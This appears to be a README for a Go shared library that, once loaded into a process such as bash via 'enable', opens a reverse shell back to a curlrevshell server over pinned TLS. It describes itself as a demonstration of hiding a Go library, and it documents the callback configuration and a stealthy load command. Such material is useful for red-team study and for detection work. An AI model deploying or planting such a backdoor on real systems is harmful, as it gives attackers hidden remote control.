`curlrevshell_https`
===================
When loaded, perhaps with bash's `enable`, connects back to
[curlrevshell](https://github.com/magisterquis/curlrevshell) and hooks up the
process's stdio to curlrevshell's `/io` URL path.

Meant to demonstrate hiding a Go library.

Config
------
Two variables may be set at compile-time using Go's `-ldflags '-X Var=Value'`:

Var | Value
-|-
PinnedPubKey | Curlrevshell's Base64'd SHA256'd TLS fingerprint, with or without `sha256//`
URL          | Curlrevshell's URL, e.g. `https://you/io`.

Quirks
------
The process should expect stdin to be a pipe, or at least not try to seek.  In
bash, this usually means loading the library with something like
```sh
exec 0<<<"enable ./x.so"
```
